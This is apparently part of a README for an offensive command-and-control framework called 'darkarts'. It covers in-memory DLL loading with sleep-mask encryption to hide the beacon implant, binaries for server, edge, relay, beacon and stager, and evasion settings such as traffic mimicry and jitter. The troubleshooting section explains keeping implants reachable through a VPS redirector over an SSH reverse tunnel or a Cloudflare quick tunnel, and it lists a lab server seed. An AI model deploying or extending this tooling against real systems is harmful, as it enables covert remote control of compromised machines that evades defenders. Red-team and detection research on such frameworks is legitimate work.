- **Sleep mask integration** — `Options.Mask` registers the module's code pages with `pkg/sleepmask` so the loaded DLL is encrypted at rest during beacon sleeps.
- **Test DLLs** (`cmd/mkdll`, hand-generated PEs, no C toolchain needed): the no-imports variant's `run` returns `base+0x87` (proves the DIR64 reloc against a random base); the imports variant returns the `kernel32.Sleep` IAT slot value + 7. `TestLoadNoImportsReloc`, `TestLoadImportsIAT`, `TestLoadNotPE`, `TestCallMissingExport` and `TestMaskedModuleRoundTrip` cover these in-process.
- **Lab results (battery 5)** — `dll` with `dll-noimports.bin`: `ret = base+0x87` (`0x18652E30087` vs base `0x18652E30000`); `dll` with `dll-imports.bin`: `ret = 0x7FFBE197FD77` (`kernel32.Sleep+7`, resolved via manual export walk); `dll` with `mask=true` loads and the beacon survives subsequent masked sleeps; inject-self and kill round-trip cleanly after the DLL loads.

## Teardown

```sh
docker compose -f lab/docker-compose.yml down        # stop containers
docker compose -f lab/docker-compose.yml down -v     # also wipe the MinIO volume
```

If a compose project was renamed or recreated and stale networks remain, remove them explicitly (`docker network rm <name>`).

## Environment reference

All binaries read `DARKARTS_*` variables. Common ones: `DARKARTS_LOG_LEVEL` (debug|info|warn|error), `DARKARTS_INSECURE=true` (plain HTTP), `DARKARTS_TLS_CERT`/`DARKARTS_TLS_KEY` (optional TLS).

| Binary | Variables |
|---|---|
| `server` | `DARKARTS_LISTEN` (default `:9000`), `DARKARTS_API_KEY`, `DARKARTS_EDGE`, `DARKARTS_PUMP_INTERVAL`, `DARKARTS_SERVER_SEED`, `DARKARTS_STATE_DIR` |
| `edge` | `DARKARTS_LISTEN` (`:8443`), `DARKARTS_STORE` (`file`\|`minio`), `DARKARTS_STORE_DIR`, `DARKARTS_COVER_HTML`, `DARKARTS_S3_ENDPOINT`/`DARKARTS_S3_ACCESS_KEY`/`DARKARTS_S3_SECRET_KEY`/`DARKARTS_S3_BUCKET`/`DARKARTS_S3_SECURE` |
| `relay` | `DARKARTS_RELAY_LISTEN` (`:7443`), `DARKARTS_UPSTREAM` (comma-separated), `DARKARTS_STORE_DIR`, `DARKARTS_RETRY` |
| `beacon` | `DARKARTS_SEED`, `DARKARTS_SERVER_PUB`, `DARKARTS_EDGE` (comma-separated candidates, tried in order), `DARKARTS_SID` (override), `DARKARTS_SLEEP`, `DARKARTS_JITTER`, `DARKARTS_TASK_TIMEOUT`, `DARKARTS_STATE_DIR`, `DARKARTS_UA`, `DARKARTS_MIMIC`, `DARKARTS_NOISE`, `DARKARTS_SLEEP_MASK` |
| `console` | `DARKARTS_SERVER_URL` (`http://127.0.0.1:9000`), `DARKARTS_API_KEY`, `DARKARTS_OP_ID` |
| `stager` | flags `-blob`, `-key`, `-manifest-out`, `-dd-dir`, `-store-dir`, `-ref`, `-operator-pub` (or `DARKARTS_OPERATOR_PUB`), `-loader memory\|child` |

## Testing

```sh
go vet ./...
go test -race ./...      # CI runs this on Linux; local Windows runs plain `go test ./...`
gofmt -l .               # must print nothing
```

## Troubleshooting

- **`stager fetch` rejects the manifest** — `-ref` is the *manifest* ref (printed as `manifest_ref` by `pack`), not the blob ref; and `-operator-pub` is derived from the operator seed via ed25519 (`OperatorKeysFromSeed`), not the X25519 agent identity derivation.
- **`dig` missing on Windows** — query through the lab container: `docker exec darkarts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab`.
- **Container fails with "Address already in use"** — a dynamic-IP container grabbed a static IP. Static IPs live at the top of each subnet (…200/…210); if you still collide, `docker compose down` and up again, or remove stale networks first.
- **Beacon polls but tasks never arrive** — verify the touched session id matches the beacon's logged `sid` exactly (32 hex chars, not the 64-char SHA-256). If `sessions` comes back empty or the pump logs `task authentication failed`, the server no longer has the session's ratchet: re-`touch` the session (or rely on the persisted `state.json`; a deleted state volume needs a fresh touch). Issuing a task to an unregistered session now fails fast with `unknown session: register the session first`.
- **Session registered, task delivered, but the beacon reports `crypto: authentication failed`** — the beacon's `DARKARTS_SERVER_PUB` does not match the server's seed. Derive it exactly from `DARKARTS_SERVER_SEED` (lab default: `a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209`).
- **Results intermittently missing** — two `beacon.exe` instances running for the same identity (e.g. double-clicked twice) post results to the same blob keys, so every other result lands on a counter the server already consumed and is silently lost. The beacon now takes a single-instance lock (named mutex on Windows) and exits immediately if one is already running — `beacon.log` will show `instance lock: another instance is already running`. Kill all beacon.exe processes and redeploy once.
- **Result posted but never appears in `/api/v1/results`** — historical counter-collision failure mode, now eliminated: the pump and the beacon delete each blob from the edge store once it is consumed, so a beacon restarted without its state file (reusing counter 0) can no longer collide with a stale blob. If you still see a gap (e.g. from an old store before this fix), purge the sid's `server/` and `beacon/` blobs from the store and restart the server.
- **Replacing an old beacon whose session has history** — a fresh beacon starts its send counter at 0, but the server's beacon-side counter for that session is already ahead, so the `since` filter strands the new beacon's first results. Reset the session server-side: stop the server, remove the sid from `send`/`sessions` in the server's `state.json` volume, start the server, and re-`touch` the session — then register/deploy the new beacon. Beacon-side state is now per-session (`state-<sid>.json`) so a beacon cannot inherit a previous session's `last_task`/`send_pos` and skip freshly queued tasks.
- **Beacon works on the lab LAN but not on a foreign WiFi** — the LAN relay IP is only reachable from the lab network. Use the VPS redirector as the primary edge — `dark-arts> redirector -Reverse <user@vps>` provisions it, starts the tunnel, and bakes `https://<vps>:443,http://<lab-ip>:7443` into the package automatically. The Cloudflare quick tunnel is only a stopgap: its URL rotates on restart and account-less tunnels get throttled (observed dead after ~13 h).
- **`redirector -Reverse` verifies with `healthz returned 502`** — nginx is up but the SSH reverse tunnel isn't established yet (or failed). Check the tunnel window for errors; on the VPS confirm the listener with `ss -tlnp | grep 7443` (a `-R` forward that fails to bind prints `remote port forwarding failed for listen port 7443`).
- **`setup.sh` dies at `apt-get update` with `Permission denied`** — the SSH user has no root. Give it passwordless sudo: `sudo bash -c 'echo "<user> ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user> && chmod 440 /etc/sudoers.d/<user>'` (from a session that already has sudo), then re-run the `redirector` command.
- **Beacon keeps probing but no `edge switched` log** — with a single edge candidate the probe is skipped entirely (nothing to fall back to); the `Warn` log only appears when at least two candidates are configured.
- **`Start-Process` (PowerShell) children lack settings** — environment variables set after spawning are not inherited; set them before `Start-Process` or use `cmd /c`.
- **Beacon cannot write its state file** — it defaults to `./data/beacon` relative to the working directory; set `DARKARTS_STATE_DIR` to a writable path (e.g. `/tmp/beacon-state`) in containers.
- **After restoring an old edge store** — stale blobs can push a fresh beacon's `last_task` past new counters; wipe the edge store on redeploys.